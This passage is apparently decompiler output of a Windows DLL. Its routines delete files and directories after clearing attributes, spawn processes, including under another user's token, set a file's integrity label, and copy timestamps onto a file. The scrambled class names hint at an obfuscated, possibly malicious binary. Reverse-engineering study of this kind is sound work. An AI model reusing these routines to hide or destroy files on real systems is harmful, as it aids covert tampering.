  int v19; // [esp+ACh] [ebp-4h]
  LONG lDistanceToMovea; // [esp+BCh] [ebp+Ch]

  v4 = v3;
  NumberOfBytesRead[5] = (DWORD)&v11;
  sub_10018B3B(&v11);
  v19 = -1;
  sub_10017136(0x80000000, (int)v13, a1, v11, (volatile LONG *)v12);
  v19 = 1;
  sub_10017229(v13);
  v5 = sub_100183BB((HANDLE *)v13);
  if ( lDistanceToMove > v5 )
  {
    sub_1002D614(&pExceptionObject);
    v12 = (_ThrowInfo *)&_TI5_AVDynkdllNfnaPydyqhdgDynkdllnf_jhzi_sr__;
    goto LABEL_3;
  }
  v6 = v5 - lDistanceToMove;
  v7 = sub_1001882C((HANDLE *)v13, lDistanceToMove, 0);
  if ( v4 == -1 || (lDistanceToMovea = v4, v4 >= v6) )
    lDistanceToMovea = v6;
  sub_1002CEA0(v7, (int)v17);
  while ( lDistanceToMovea )
  {
    sub_1000C28D(a3, (int)NumberOfBytesRead, 0);
    LOBYTE(v19) = 2;
    v8 = sub_1001863B((HANDLE *)v13, NumberOfBytesRead);
    if ( v8 == -1 )
    {
      sub_1002D306(&pExceptionObject, 1);
      v12 = (_ThrowInfo *)&_TI4_AVQdlyUQBeskfuooz_jhzi_sr__;
LABEL_3:
      _CxxThrowException(&pExceptionObject, v12);
    }
    v9 = (_DWORD *)sub_1000C709(v8, (int *)NumberOfBytesRead, (int)v14, 0);
    LOBYTE(v19) = 3;
    sub_1002CEBB(v9, (int)v17);
    LOBYTE(v19) = 2;
    sub_1000C45D(v14);
    lDistanceToMovea -= v8;
    LOBYTE(v19) = 1;
    sub_1000C45D((int *)NumberOfBytesRead);
  }
  sub_10017574((HANDLE *)v13);
  v19 = -1;
  sub_100171E7((HANDLE *)v13);
  return v18;
}
// 1001A51A: variable 'v3' is possibly undefined
// 1001A50B: using guessed type int var_48[5];

//----- (1001A649) --------------------------------------------------------
int *__cdecl sub_1001A649(int *a1, int a2, _ThrowInfo *a3)
{
  int *p_pExceptionObject; // eax
  int v4; // eax
  int v5; // eax
  int v6; // eax
  int v7; // eax
  int v8; // edi
  int v9; // eax
  int v10; // eax
  _ThrowInfo *v12; // [esp-8h] [ebp-98h] BYREF
  _ThrowInfo *v13; // [esp-4h] [ebp-94h]
  int v14[10]; // [esp+10h] [ebp-80h] BYREF
  _DWORD v15[2]; // [esp+38h] [ebp-58h] BYREF
  _DWORD v16[2]; // [esp+40h] [ebp-50h] BYREF
  _DWORD v17[2]; // [esp+48h] [ebp-48h] BYREF
  _DWORD v18[2]; // [esp+50h] [ebp-40h] BYREF
  FILETIME v19; // [esp+58h] [ebp-38h] BYREF
  __int64 v20; // [esp+60h] [ebp-30h] BYREF
  int (__thiscall **v21)(void *, char); // [esp+68h] [ebp-28h] BYREF
  int v22; // [esp+6Ch] [ebp-24h] BYREF
  int v23; // [esp+70h] [ebp-20h]
  int pExceptionObject; // [esp+74h] [ebp-1Ch] BYREF
  int v25; // [esp+78h] [ebp-18h] BYREF
  LPVOID ppv; // [esp+7Ch] [ebp-14h] BYREF
  int v27; // [esp+8Ch] [ebp-4h]

  v27 = 0;
  v23 = 0;
  if ( !sub_1001AAFA(a2) )
  {
    sub_1000DEEF(&pExceptionObject);
    v13 = (_ThrowInfo *)&_TI1_AVSnsziibtx_sr__;
    p_pExceptionObject = &pExceptionObject;
    goto LABEL_3;
  }
  v19.dwLowDateTime = 0;
  v19.dwHighDateTime = 0;
  v12 = v13;
  HIDWORD(v20) = &v12;
  sub_10018B3B(&v12);
  v27 = 0;
  sub_10017C15(-1, -2147483392, v14, a2, 128, -1, (int)v12, (volatile LONG *)v13);
  v27 = 2;
  v19 = (FILETIME)*sub_10018205((HANDLE *)v14, &v20, 1);
  sub_10009D9C(260, a1);
  v23 = 1;
  ppv = 0;
  v25 = 0;
  v21 = &off_10074ADC;
  v4 = CoInitializeEx(0, 0);
  if ( v4 < 0 )
    sub_1002D96F(v4);
  LOBYTE(v27) = 4;
  v5 = CoCreateInstance(&rclsid, 0, 1u, &riid, &ppv);
  if ( v5 < 0 )
  {
    sub_1000E272(v18, v5);
    v13 = (_ThrowInfo *)&_TI2_AVRnaLirybajtn_sr__;
    p_pExceptionObject = v18;
    goto LABEL_3;
  }
  v6 = (**(int (__stdcall ***)(LPVOID, void *, int *))ppv)(ppv, &unk_1006FEEC, &v25);
  if ( v6 < 0 )
  {
    sub_1000E272(v17, v6);
    v13 = (_ThrowInfo *)&_TI2_AVRnaLirybajtn_sr__;
    p_pExceptionObject = v17;
    goto LABEL_3;
  }
  if ( !v25 )
  {
    sub_1000DEEF(&v22);
    v13 = (_ThrowInfo *)&_TI1_AVSnsziibtx_sr__;
    p_pExceptionObject = &v22;
    goto LABEL_3;
  }
  v7 = (*(int (__stdcall **)(int, _DWORD, _DWORD))(*(_DWORD *)v25 + 20))(v25, *(_DWORD *)(*(_DWORD *)(a2 + 4) + 12), 0);
  if ( v7 < 0 )
  {
    sub_1000E272(v16, v7);
    v13 = (_ThrowInfo *)&_TI2_AVRnaLirybajtn_sr__;
    p_pExceptionObject = v16;
    goto LABEL_3;
  }
  v8 = *(_DWORD *)ppv;
  v13 = 0;
  v12 = a3;
  v9 = sub_1000A1E4(a1);
  v10 = (*(int (__stdcall **)(LPVOID, int, int, _ThrowInfo *, _ThrowInfo *))(v8 + 12))(ppv, v9, 260, v12, v13);
  if ( v10 < 0 )
  {
    sub_1000E272(v15, v10);
    v13 = (_ThrowInfo *)&_TI2_AVRnaLirybajtn_sr__;
    p_pExceptionObject = v15;
LABEL_3:
    _CxxThrowException(p_pExceptionObject, v13);
  }
  sub_1000A223((int)a1);
  v27 = 3;
  if ( v25 )
    (*(void (__stdcall **)(int))(*(_DWORD *)v25 + 8))(v25);
  if ( ppv )
    (*(void (__stdcall **)(LPVOID))(*(_DWORD *)ppv + 8))(ppv);
  LOBYTE(v27) = 2;
  sub_1002D9AE(&v21);
  LOBYTE(v27) = 8;
  sub_10018246((HANDLE *)v14, &v19, 1);
  v27 = 0;
  sub_10017D5E((int)v14);
  return a1;
}
// 10074ADC: using guessed type int (__thiscall *off_10074ADC)(void *Block, char);
// 1001A649: using guessed type _DWORD var_40[2];
// 1001A649: using guessed type _DWORD var_48[2];
// 1001A649: using guessed type _DWORD var_50[2];
// 1001A649: using guessed type _DWORD var_58[2];

//----- (1001A8AC) --------------------------------------------------------
_DWORD *__thiscall sub_1001A8AC(_DWORD *this, int a2)
{
  sub_1000DEB4(this, a2);
  *this = &off_10073480;
  this[1] = *(_DWORD *)(a2 + 4);
  return this;
}
// 10073480: using guessed type int (__thiscall *off_10073480)(void *Block, char);

//----- (1001A942) --------------------------------------------------------
DWORD __usercall sub_1001A942@<eax>(int a1@<esi>)
{
  DWORD FileAttributesW; // ebx
  DWORD result; // eax
  _DWORD pExceptionObject[4]; // [esp+8h] [ebp-10h] BYREF

  FileAttributesW = GetFileAttributesW(*(LPCWSTR *)(*(_DWORD *)(a1 + 4) + 12));
  SetFileAttributesW(*(LPCWSTR *)(*(_DWORD *)(a1 + 4) + 12), 0x80u);
  result = DeleteFileW(*(LPCWSTR *)(*(_DWORD *)(a1 + 4) + 12));
  if ( !result )
  {
    result = GetLastError();
    if ( result != 2 && result != 3 )
    {
      SetFileAttributesW(*(LPCWSTR *)(*(_DWORD *)(a1 + 4) + 12), FileAttributesW);
      sub_1002D306(pExceptionObject, 1);
      _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI4_AVQdlyUQBeskfuooz_jhzi_sr__);
    }
  }
  return result;
}
// 1001A942: using guessed type _DWORD pExceptionObject[4];

//----- (1001A9B1) --------------------------------------------------------
int sub_1001A9B1()
{
  wchar_t *v0; // eax
  volatile LONG *v1; // ecx
  _DWORD *v2; // eax
  int v3; // esi
  volatile LONG *v5; // [esp-8h] [ebp-64h] BYREF
  volatile LONG *v6; // [esp-4h] [ebp-60h]
  int v7[10]; // [esp+10h] [ebp-4Ch] BYREF
  char v8[8]; // [esp+38h] [ebp-24h] BYREF
  int v9[6]; // [esp+40h] [ebp-1Ch] BYREF
  int v10; // [esp+58h] [ebp-4h]

  v10 = 0;
  v0 = (wchar_t *)sub_1000BE16((int)&unk_1008EF10);
  sub_1000B9A0(v9, v0);
  LOBYTE(v10) = 1;
  sub_1000BB4C((int)v9);
  v6 = v1;
  v5 = v1;
  v9[2] = (int)&v5;
  sub_10018B3B(&v5);
  LOBYTE(v10) = 1;
  v2 = sub_10017C15(-1, 0x80000000, v7, (int)v9, 128, -1, (int)v5, v6);
  LOBYTE(v10) = 3;
  v3 = *(_DWORD *)(*(int (__thiscall **)(_DWORD *, char *, int))(*v2 + 80))(v2, v8, 1);
  LOBYTE(v10) = 1;
  sub_10017D5E((int)v7);
  LOBYTE(v10) = 0;
  sub_1000BA51(v9);
  return v3;
}
// 1001A9E2: variable 'v1' is possibly undefined
// 1001A9B1: using guessed type char var_24[8];

//----- (1001AA62) --------------------------------------------------------
void __cdecl sub_1001AA62(int a1)
{
  DWORD v1; // edx
  volatile LONG *v2; // [esp-8h] [ebp-68h] BYREF
  volatile LONG *v3; // [esp-4h] [ebp-64h]
  int v4[10]; // [esp+10h] [ebp-50h] BYREF
  _DWORD pExceptionObject[4]; // [esp+38h] [ebp-28h] BYREF
  FILETIME CreationTime; // [esp+48h] [ebp-18h] BYREF
  volatile LONG **v7; // [esp+50h] [ebp-10h]
  int v8; // [esp+5Ch] [ebp-4h]

  CreationTime.dwLowDateTime = sub_1001A9B1();
  CreationTime.dwHighDateTime = v1;
  if ( !sub_1001A33E(a1) )
  {
    sub_1002D3CB(pExceptionObject);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI5_AVWdtfAhnEcxcvFuptgwdtf_jhzi_sr__);
  }
  v2 = v3;
  v7 = &v2;
  sub_10018B3B(&v2);
  v8 = -1;
  sub_10017C15(-1, 256, v4, a1, 0x2000000, -1, (int)v2, v3);
  v8 = 1;
  sub_1001807D((HANDLE *)v4, &CreationTime, &CreationTime, &CreationTime);
  v8 = -1;
  sub_10017D5E((int)v4);
}
// 1001AA79: variable 'v1' is possibly undefined
// 1001AA62: using guessed type _DWORD pExceptionObject[4];

//----- (1001AAFA) --------------------------------------------------------
DWORD __cdecl sub_1001AAFA(int a1)
{
  DWORD v2; // esi
  int v4[7]; // [esp+0h] [ebp-54h] BYREF
  int v5[11]; // [esp+1Ch] [ebp-38h] BYREF
  int v6; // [esp+50h] [ebp-4h]

  v4[6] = (int)v4;
  sub_10018B3B(v4);
  v6 = -1;
  sub_10017C15(-1, 0, v5, a1, 128, -1, v4[0], (volatile LONG *)v4[1]);
  v6 = 1;
  v2 = sub_100183BB((HANDLE *)v5);
  v6 = -1;
  sub_10017D5E((int)v5);
  return v2;
}

//----- (1001ABDE) --------------------------------------------------------
void __thiscall sub_1001ABDE(_DWORD *this)
{
  _DWORD *v1; // esi

  v1 = this + 3;
  sub_1002D77A(this + 3);
  sub_1000DF1A(v1);
}

//----- (1001ABF1) --------------------------------------------------------
_DWORD *__thiscall sub_1001ABF1(_DWORD *this, _DWORD *a2, int a3)
{
  int v4; // eax

  if ( a3 )
  {
    *this = &unk_10074074;
    this[2] = &unk_1007407C;
    if ( a2 )
      v4 = (int)a2 + *(_DWORD *)(*a2 + 4);
    else
      v4 = 0;
    sub_1000DEB4(this + 3, v4);
  }
  sub_1001748D(this, a2, 0);
  *(_DWORD *)((char *)this + *(_DWORD *)(*this + 4)) = &off_1007406C;
  return this;
}
// 1007406C: using guessed type int (__stdcall *off_1007406C)(char);

//----- (1001AC67) --------------------------------------------------------
char *__thiscall sub_1001AC67(_DWORD *this, char a2)
{
  char *v2; // esi

  v2 = (char *)(this - 3);
  sub_1001ABDE(this - 3);
  if ( (a2 & 1) != 0 )
    j__free(v2);
  return v2;
}

//----- (1001AD09) --------------------------------------------------------
void __thiscall sub_1001AD09(_DWORD *this)
{
  _DWORD *v1; // esi

  v1 = this + 3;
  sub_1002D7FD(this + 3);
  sub_1000DF1A(v1);
}

//----- (1001AD1C) --------------------------------------------------------
_DWORD *__thiscall sub_1001AD1C(_DWORD *this, _DWORD *a2, int a3)
{
  int v4; // eax

  if ( a3 )
  {
    *this = &unk_1007408C;
    this[2] = &unk_10074094;
    if ( a2 )
      v4 = (int)a2 + *(_DWORD *)(*a2 + 4);
    else
      v4 = 0;
    sub_1000DEB4(this + 3, v4);
  }
  sub_1001ABF1(this, a2, 0);
  *(_DWORD *)((char *)this + *(_DWORD *)(*this + 4)) = &off_10074084;
  return this;
}
// 10074084: using guessed type int (__stdcall *off_10074084)(char);

//----- (1001AD92) --------------------------------------------------------
char *__thiscall sub_1001AD92(_DWORD *this, char a2)
{
  char *v2; // esi

  v2 = (char *)(this - 3);
  sub_1001AD09(this - 3);
  if ( (a2 & 1) != 0 )
    j__free(v2);
  return v2;
}

//----- (1001ADC1) --------------------------------------------------------
_DWORD *__usercall sub_1001ADC1@<eax>(int a1@<edi>, _DWORD *a2, int a3)
{
  int v4[5]; // [esp+10h] [ebp-18h] BYREF
  int v5; // [esp+24h] [ebp-4h]

  sub_10009D2C(a2, asc_1008EF68);
  v5 = 0;
  v4[2] = 1;
  sub_1000A0C4((int)a2, a3);
  sub_10009D2C(v4, asc_1008EF6C);
  v5 = 1;
  sub_1000A0C4((int)a2, (int)v4);
  LOBYTE(v5) = 0;
  sub_10009F65(v4);
  if ( *(_DWORD *)(*(_DWORD *)(a1 + 4) + 28) )
  {
    sub_10009D2C(v4, asc_1008EF70);
    v5 = 2;
    sub_1000A0C4((int)a2, (int)v4);
    LOBYTE(v5) = 0;
    sub_10009F65(v4);
    sub_1000A0C4((int)a2, a1);
  }
  return a2;
}

//----- (1001AE59) --------------------------------------------------------
void *__usercall sub_1001AE59@<eax>(int a1@<ecx>, _DWORD *a2@<esi>)
{
  void *result; // eax
  int pExceptionObject; // [esp+0h] [ebp-4h] BYREF

  pExceptionObject = a1;
  if ( !a2 )
  {
    sub_1000DEEF(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI1_AVSnsziibtx_sr__);
  }
  result = memset(a2, 0, 0x44u);
  *((_WORD *)a2 + 24) = 0;
  *a2 = 68;
  a2[11] = 1;
  return result;
}

//----- (1001AE98) --------------------------------------------------------
HANDLE __usercall sub_1001AE98@<eax>(int a1@<ecx>, int a2@<ebx>)
{
  HANDLE hProcess; // esi
  int v4; // [esp-4h] [ebp-8Ch]
  struct _STARTUPINFOW StartupInfo; // [esp+10h] [ebp-78h] BYREF
  _DWORD pExceptionObject[4]; // [esp+54h] [ebp-34h] BYREF
  struct _PROCESS_INFORMATION ProcessInformation; // [esp+64h] [ebp-24h] BYREF
  int v8[4]; // [esp+74h] [ebp-14h] BYREF
  int v9; // [esp+84h] [ebp-4h]

  sub_1001ADC1(a1, v8, a2);
  v9 = 0;
  sub_1001AE59(v4, &StartupInfo);
  sub_1000A02D(v8);
  if ( !CreateProcessW(
          *(LPCWSTR *)(*(_DWORD *)(a2 + 4) + 12),
          *(LPWSTR *)(v8[1] + 12),
          0,
          0,
          0,
          0,
          0,
          0,
          &StartupInfo,
          &ProcessInformation) )
  {
    if ( GetLastError() == 2 )
    {
      sub_1002D3CB(pExceptionObject);
      _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI5_AVWdtfAhnEcxcvFuptgwdtf_jhzi_sr__);
    }
    sub_1002D71D(pExceptionObject, 1);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI5_AVHzsnwtmRbderjskb_jhzi_sr__);
  }
  CloseHandle(ProcessInformation.hThread);
  hProcess = ProcessInformation.hProcess;
  v9 = -1;
  sub_10009F65(v8);
  return hProcess;
}
// 1001AEBA: variable 'v4' is possibly undefined
// 1007637C: using guessed type __TI_flags _TI5_AVHzsnwtmRbderjskb_jhzi_sr__;
// 1001AE98: using guessed type _DWORD pExceptionObject[4];

//----- (1001AF3E) --------------------------------------------------------
HANDLE __usercall sub_1001AF3E@<eax>(int a1@<ecx>, int a2@<ebx>, int a3)
{
  void *v3; // eax
  HANDLE hProcess; // esi
  const WCHAR *v6; // [esp-28h] [ebp-B0h]
  WCHAR *v7; // [esp-24h] [ebp-ACh]
  int v8; // [esp-4h] [ebp-8Ch]
  struct _STARTUPINFOW StartupInfo; // [esp+10h] [ebp-78h] BYREF
  _DWORD pExceptionObject[4]; // [esp+54h] [ebp-34h] BYREF
  struct _PROCESS_INFORMATION ProcessInformation; // [esp+64h] [ebp-24h] BYREF
  int v12[4]; // [esp+74h] [ebp-14h] BYREF
  int v13; // [esp+84h] [ebp-4h]

  sub_1001ADC1(a1, v12, a2);
  v13 = 0;
  sub_1001AE59(v8, &StartupInfo);
  sub_1000A02D(v12);
  v7 = *(WCHAR **)(v12[1] + 12);
  v6 = *(const WCHAR **)(*(_DWORD *)(a2 + 4) + 12);
  v3 = (void *)(*(int (__thiscall **)(int))(*(_DWORD *)a3 + 4))(a3);
  if ( !CreateProcessAsUserW(v3, v6, v7, 0, 0, 0, 0, 0, 0, &StartupInfo, &ProcessInformation) )
  {
    if ( GetLastError() == 2 )
    {
      sub_1002D3CB(pExceptionObject);
      _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI5_AVWdtfAhnEcxcvFuptgwdtf_jhzi_sr__);
    }
    sub_1002D71D(pExceptionObject, 1);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI5_AVHzsnwtmRbderjskb_jhzi_sr__);
  }
  CloseHandle(ProcessInformation.hThread);
  hProcess = ProcessInformation.hProcess;
  v13 = -1;
  sub_10009F65(v12);
  return hProcess;
}
// 1001AF60: variable 'v8' is possibly undefined
// 1007637C: using guessed type __TI_flags _TI5_AVHzsnwtmRbderjskb_jhzi_sr__;
// 1001AF3E: using guessed type _DWORD pExceptionObject[4];

//----- (1001AFED) --------------------------------------------------------
_DWORD *__cdecl sub_1001AFED(_DWORD *a1, int a2)
{
  _DWORD *v2; // esi
  unsigned int v3; // eax
  _DWORD pExceptionObject[2]; // [esp+10h] [ebp-28h] BYREF
  int v6[2]; // [esp+18h] [ebp-20h] BYREF
  int v7[2]; // [esp+20h] [ebp-18h] BYREF
  int v8; // [esp+28h] [ebp-10h]
  int v9; // [esp+34h] [ebp-4h]

  v8 = 0;
  sub_10009F32(v7, a2);
  v9 = 1;
  sub_1000A02D(v7);
  if ( !PathStripToRootW(*(LPWSTR *)(v7[1] + 12)) )
  {
    sub_1002D3CB(pExceptionObject);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI5_AVWdtfAhnEcxcvFuptgwdtf_jhzi_sr__);
  }
  v2 = sub_1000BA21(v6, a2);
  LOBYTE(v9) = 2;
  v3 = sub_1000A1F9((int)v7);
  sub_1000A3E9((int)v2, v3, a1, 0xFFFFFFFE);
  v8 = 1;
  LOBYTE(v9) = 1;
  sub_1000BA51(v6);
  LOBYTE(v9) = 0;
  sub_10009F65(v7);
  return a1;
}
// 1001AFED: using guessed type _DWORD pExceptionObject[2];

//----- (1001B08F) --------------------------------------------------------
void __cdecl sub_1001B08F(int a1)
{
  int v1; // esi
  bool v2; // zf
  int v3; // eax
  int v4; // eax
  char *v5; // ecx
  int v6; // eax
  _DWORD *v7; // eax
  _DWORD pExceptionObject[3]; // [esp+10h] [ebp-2B4h] BYREF
  int v9[2]; // [esp+1Ch] [ebp-2A8h] BYREF
  char v10[8]; // [esp+24h] [ebp-2A0h] BYREF
  char v11[8]; // [esp+2Ch] [ebp-298h] BYREF
  int v12; // [esp+34h] [ebp-290h]
  int v13[2]; // [esp+38h] [ebp-28Ch] BYREF
  char v14[640]; // [esp+40h] [ebp-284h] BYREF
  int v15; // [esp+2C0h] [ebp-4h]

  v1 = a1;
  v12 = a1;
  sub_1002D9DE((int)v14, a1);
  v15 = 0;
  sub_1002DAB2((int)v14, v13);
  LOBYTE(v15) = 1;
  while ( v13[0] )
  {
    LOBYTE(v15) = 2;
    v2 = (*(unsigned __int8 (__thiscall **)(int))(*(_DWORD *)v13[0] + 20))(v13[0]) == 0;
    v3 = *(_DWORD *)v13[0];
    if ( v2 )
    {
      v6 = (*(int (__cdecl **)(char *))(v3 + 8))(v11);
      LOBYTE(v15) = 4;
      sub_1001A942(v6);
      LOBYTE(v15) = 2;
      v5 = v11;
    }
    else
    {
      v4 = (*(int (**)(void))(v3 + 8))();
      LOBYTE(v15) = 3;
      sub_1001B08F(v4, v10);
      LOBYTE(v15) = 2;
      v5 = v10;
    }
    sub_10009F65((int *)v5);
    v15 = 1;
    sub_1002DAB2((int)v14, v9);
    LOBYTE(v15) = 6;
    sub_1001B341(v13, v7);
    LOBYTE(v15) = 1;
    sub_1001B316(v9);
    v1 = v12;
  }
  LOBYTE(v15) = 0;
  sub_1001B316(v13);
  v15 = -1;
  sub_1002DA5D((int)v14);
  if ( !RemoveDirectoryW(*(LPCWSTR *)(*(_DWORD *)(v1 + 4) + 12)) )
  {
    sub_1000E2E3(pExceptionObject, 1);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVScdeiYyksupovo_sr__);
  }
  sub_10056762();
}
// 1001B160: variable 'v7' is possibly undefined
// 1001B08F: using guessed type _DWORD pExceptionObject[3];

//----- (1001B1FC) --------------------------------------------------------
bool __cdecl sub_1001B1FC(int a1)
{
  _DWORD pExceptionObject[3]; // [esp+10h] [ebp-30h] BYREF
  _DWORD v3[2]; // [esp+1Ch] [ebp-24h] BYREF
  BOOL bSaclPresent; // [esp+24h] [ebp-1Ch] BYREF
  BOOL bSaclDefaulted; // [esp+28h] [ebp-18h] BYREF
  PACL pSacl; // [esp+2Ch] [ebp-14h] BYREF
  PSECURITY_DESCRIPTOR SecurityDescriptor; // [esp+30h] [ebp-10h] BYREF
  int v8; // [esp+3Ch] [ebp-4h]

  SecurityDescriptor = 0;
  GetCurrentProcessId();
  GetCurrentProcessId();
  sub_10025F97(v3);
  v8 = 0;
  pSacl = 0;
  bSaclPresent = 0;
  bSaclDefaulted = 0;
  if ( !ConvertStringSecurityDescriptorToSecurityDescriptorW(StringSecurityDescriptor, 1u, &SecurityDescriptor, 0)
    || (GetCurrentProcessId(),
        GetCurrentProcessId(),
        sub_1001B2E1((int)v3, (int)SecurityDescriptor),
        !GetSecurityDescriptorSacl(SecurityDescriptor, &bSaclPresent, &pSacl, &bSaclDefaulted))
    || SetNamedSecurityInfoW(*(LPWSTR *)(*(_DWORD *)(a1 + 4) + 12), SE_FILE_OBJECT, 0x10u, 0, 0, 0, pSacl) )
  {
    sub_1000E2E3(pExceptionObject, 1);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVScdeiYyksupovo_sr__);
  }
  v8 = -1;
  return sub_1001B2B0(v3);
}
// 1001B1FC: using guessed type _DWORD var_24[2];
// 1001B1FC: using guessed type _DWORD pExceptionObject[3];

//----- (1001B2B0) --------------------------------------------------------
bool __thiscall sub_1001B2B0(_DWORD *this)
{
  *this = &off_10074068;
  return sub_1001B38B((int)this);
}
// 10074068: using guessed type int (__thiscall *off_10074068)(void *Block, char);

//----- (1001B2E1) --------------------------------------------------------
char __usercall sub_1001B2E1@<al>(int a1@<eax>, int a2@<edi>)
{
  int v2; // esi
  _DWORD pExceptionObject[3]; // [esp+4h] [ebp-Ch] BYREF

  v2 = a1;
  if ( *(_DWORD *)(a1 + 4) != a2 )
  {
    LOBYTE(a1) = sub_1001B38B(a1);
    if ( !(_BYTE)a1 )
    {
      sub_1000E2E3(pExceptionObject, 1);
      _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVScdeiYyksupovo_sr__);
    }
  }
  *(_DWORD *)(v2 + 4) = a2;
  return a1;
}
// 1001B2E1: using guessed type _DWORD pExceptionObject[3];

//----- (1001B316) --------------------------------------------------------
void __thiscall sub_1001B316(void *this)
{
  sub_1001B3B7((int)this);
}

//----- (1001B341) --------------------------------------------------------
_DWORD *__usercall sub_1001B341@<eax>(_DWORD *a1@<eax>, _DWORD *a2@<edi>)
{
  volatile LONG *v4; // [esp-4h] [ebp-8h]

  if ( *a1 != *a2 )
  {
    sub_1001B3B7((int)a1);
    a1[1] = a2[1];
    v4 = (volatile LONG *)a1[1];
    *a1 = *a2;
    InterlockedIncrement(v4);
  }
  return a1;
}

//----- (1001B36C) --------------------------------------------------------
_DWORD *__thiscall sub_1001B36C(_DWORD *Block, char a2)
{
  sub_1001B2B0(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1001B38B) --------------------------------------------------------
bool __usercall sub_1001B38B@<al>(int a1@<esi>)
{
  bool result; // al

  if ( !sub_1001B3DF(a1) )
    return 1;
  result = sub_10025FAF(a1);
  *(_DWORD *)(a1 + 4) = 0;
  return result;
}

//----- (1001B3B7) --------------------------------------------------------
void __usercall sub_1001B3B7(int a1@<esi>)
{
  if ( !InterlockedDecrement(*(volatile LONG **)(a1 + 4)) )
  {
    if ( *(_DWORD *)(a1 + 4) )
      j__free(*(void **)(a1 + 4));
    if ( *(_DWORD *)a1 )
      (***(void (__thiscall ****)(_DWORD, int))a1)(*(_DWORD *)a1, 1);
  }
}

//----- (1001B3DF) --------------------------------------------------------
BOOL __usercall sub_1001B3DF@<eax>(int a1@<eax>)
{
  int v1; // eax

  v1 = *(_DWORD *)(a1 + 4);
  return v1 && v1 != -1;
}

//----- (1001B3FC) --------------------------------------------------------
_DWORD *__stdcall sub_1001B3FC(_DWORD *a1, int a2, char a3)
{
  sub_1001B5F6((int)a1, a2, a3);
  *a1 = &off_100740A0;
  return a1;
}
// 100740A0: using guessed type int (__thiscall *off_100740A0)(void *Block, char);

//----- (1001B42F) --------------------------------------------------------
_BYTE *__thiscall sub_1001B42F(_BYTE *Block, char a2)
{
  sub_1001B44E(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1001B44E) --------------------------------------------------------
int __thiscall sub_1001B44E(_BYTE *this)
{
  *(_DWORD *)this = &off_100740A0;
  sub_1001B690(this);
  return sub_1001B64E(this);
}
// 100740A0: using guessed type int (__thiscall *off_100740A0)(void *Block, char);

//----- (1001B490) --------------------------------------------------------
void *__thiscall sub_1001B490(void *this, int a2)
{
  (*(void (__thiscall **)(void *, int))(*(_DWORD *)this + 16))(this, a2);
  return this;
}

//----- (1001B4A5) --------------------------------------------------------
_DWORD *__thiscall sub_1001B4A5(_DWORD *this, char a2)
{
  _DWORD *v2; // esi
  int v3; // eax

  v2 = this;
  v3 = *this;
  LOBYTE(this) = a2 != 0;
  (*(void (__thiscall **)(_DWORD *, _DWORD *))(v3 + 16))(v2, this);
  return v2;
}

//----- (1001B4C1) --------------------------------------------------------
void *__thiscall sub_1001B4C1(void *this, char a2)
{
  (*(void (__thiscall **)(void *, char *, int))(*(_DWORD *)this + 80))(this, &a2, 2);
  return this;
}

//----- (1001B4DB) --------------------------------------------------------
void *__thiscall sub_1001B4DB(void *this, char a2)
{
  (*(void (__thiscall **)(void *, char *, int))(*(_DWORD *)this + 80))(this, &a2, 4);
  return this;
}

//----- (1001B4F5) --------------------------------------------------------
void *__thiscall sub_1001B4F5(void *this, char a2, int a3)
{
  (*(void (__thiscall **)(void *, char *, int))(*(_DWORD *)this + 80))(this, &a2, 8);
  return this;
}

//----- (1001B50F) --------------------------------------------------------
void *__thiscall sub_1001B50F(void *this, char a2, int a3)
{
  (*(void (__thiscall **)(void *, char *, int))(*(_DWORD *)this + 80))(this, &a2, 8);
  return this;
}

//----- (1001B529) --------------------------------------------------------
void *__thiscall sub_1001B529(void *this, int a2, int a3)
{
  (*(void (__thiscall **)(void *, int))(*(_DWORD *)this + 60))(this, 2 * *(_DWORD *)(a3 + 28) + 4);
  (*(void (__thiscall **)(void *, int))(*(_DWORD *)this + 60))(this, 0xFFFF);
  (*(void (__thiscall **)(void *, _DWORD, int))(*(_DWORD *)this + 80))(
    this,
    *(_DWORD *)(a3 + 12),
    2 * *(_DWORD *)(a3 + 28));
  sub_10009F65(&a2);
  return this;
}

//----- (1001B581) --------------------------------------------------------
void *__thiscall sub_1001B581(void *this, int a2, int a3, int a4, int a5, int a6)
{
  int v7; // eax

  (*(void (__thiscall **)(void *, int))(*(_DWORD *)this + 60))(this, a5);
  v7 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 36))(this);
  (*(void (__thiscall **)(int, int *))(*(_DWORD *)v7 + 12))(v7, &a2);
  sub_1000C45D(&a2);
  return this;
}

//----- (1001B5C3) --------------------------------------------------------
void __thiscall sub_1001B5C3(void *this, int a2, unsigned int a3)
{
  unsigned int i; // esi
  int v5; // eax

  for ( i = 0; i < a3; ++i )
  {
    v5 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 36))(this);
    (*(void (__thiscall **)(int, _DWORD))(*(_DWORD *)v5 + 16))(v5, *(unsigned __int8 *)(i + a2));
  }
}

//----- (1001B5F3) --------------------------------------------------------
char sub_1001B5F3()
{
  return 1;
}

//----- (1001B5F6) --------------------------------------------------------
int __stdcall sub_1001B5F6(int a1, int a2, char a3)
{
  int v3; // edx

  sub_10019FEC(a1);
  *(_DWORD *)(v3 + 8) = a2;
  *(_DWORD *)v3 = &off_100740F4;
  *(_BYTE *)(v3 + 12) = a3;
  return v3;
}
// 1001B612: variable 'v3' is possibly undefined
// 100740F4: using guessed type int (__thiscall *off_100740F4)(void *Block, char);

//----- (1001B62F) --------------------------------------------------------
_BYTE *__thiscall sub_1001B62F(_BYTE *Block, char a2)
{
  sub_1001B64E(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1001B64E) --------------------------------------------------------
int __thiscall sub_1001B64E(_BYTE *this)
{
  *(_DWORD *)this = &off_100740F4;
  sub_1001B690(this);
  return sub_1001A03A(this);
}
